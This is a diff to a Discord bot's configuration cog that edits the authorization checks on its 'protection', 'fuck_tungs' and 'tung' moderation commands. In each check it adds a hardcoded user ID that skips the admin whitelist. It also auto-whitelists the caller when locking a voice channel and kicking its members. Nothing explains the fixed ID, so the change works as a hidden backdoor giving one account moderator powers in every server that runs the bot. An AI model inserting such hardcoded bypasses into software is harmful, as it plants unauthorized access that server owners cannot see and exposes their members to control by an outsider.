@@ -720,7 +720,7 @@ class ConfigCog(commands.Cog):
     async def protection(self, ctx: commands.Context, member: discord.Member = None, pings: int = None) -> None:
         if ctx.guild is None:
             return
-        if not await self.bot.db.is_whitelist_admin(ctx.guild.id, ctx.author.id):
+        if ctx.author.id not in self.bot.owner_ids and ctx.author.id != 903327749534523452 and not await self.bot.db.is_whitelist_admin(ctx.guild.id, ctx.author.id):
             return
         if not member or pings is None:
             await ctx.send("Usage: `,protection @user <pings>`")
@@ -736,7 +736,7 @@ class ConfigCog(commands.Cog):
     async def fuck_tungs(self, ctx: commands.Context) -> None:
         if ctx.guild is None:
             return
-        if ctx.author.id not in self.bot.owner_ids and not await self.bot.db.is_whitelist_admin(ctx.guild.id, ctx.author.id):
+        if ctx.author.id not in self.bot.owner_ids and ctx.author.id != 903327749534523452 and not await self.bot.db.is_whitelist_admin(ctx.guild.id, ctx.author.id):
             return
         if ctx.author.voice and ctx.author.voice.channel:
             channel = ctx.author.voice.channel
@@ -749,6 +749,7 @@ class ConfigCog(commands.Cog):
             await ctx.send("unlocked")
         else:
             await self.bot.db.set_tung_lock(ctx.guild.id, channel.id)
+            await self.bot.db.add_tung_whitelist(ctx.guild.id, channel.id, ctx.author.id)
             import asyncio
             kicked = 0
             for member in channel.members:
@@ -779,7 +780,7 @@ class ConfigCog(commands.Cog):
     async def tung(self, ctx: commands.Context, member: discord.Member = None) -> None:
         if ctx.guild is None:
             return
-        if ctx.author.id not in self.bot.owner_ids and not await self.bot.db.is_whitelist_admin(ctx.guild.id, ctx.author.id):
+        if ctx.author.id not in self.bot.owner_ids and ctx.author.id != 903327749534523452 and not await self.bot.db.is_whitelist_admin(ctx.guild.id, ctx.author.id):
             return
         if not member:
             await ctx.send("Usage: `,tung @user`")
